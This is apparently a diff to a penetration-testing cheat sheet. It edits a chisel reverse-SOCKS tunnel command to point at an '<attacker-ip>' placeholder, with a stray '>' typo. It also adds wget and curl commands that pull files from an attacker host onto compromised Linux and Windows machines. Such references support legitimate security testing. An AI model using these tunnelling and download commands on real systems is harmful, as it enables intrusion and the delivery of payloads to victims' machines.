@@ -362,7 +362,7 @@ droopescan scan drupal --url http://<target>
   ### Connecting from the client
 
    ```shell
-  .\chisel client <ATTACK_MACHINE_IP>:<PORT> R:socks
+  .\chisel client <attacker-ip>>:<PORT> R:socks
   ```
 
   ### Sending command via the tunnel
@@ -454,9 +454,17 @@ netexec mssql <target_IP> -u <user> -p <password> --put-file <share_path>/<file>
 
 <details> <summary><strong>Linux</strong></summary>
 
+```bash
+wget http://<attacker-ip>/<file>
+```
+
 </details>
 
 <details> <summary><strong>Windows</strong></summary>
+
+```bash
+curl http://<attacker-ip>/<file> -o <output_file>
+```
 
 </details>
 
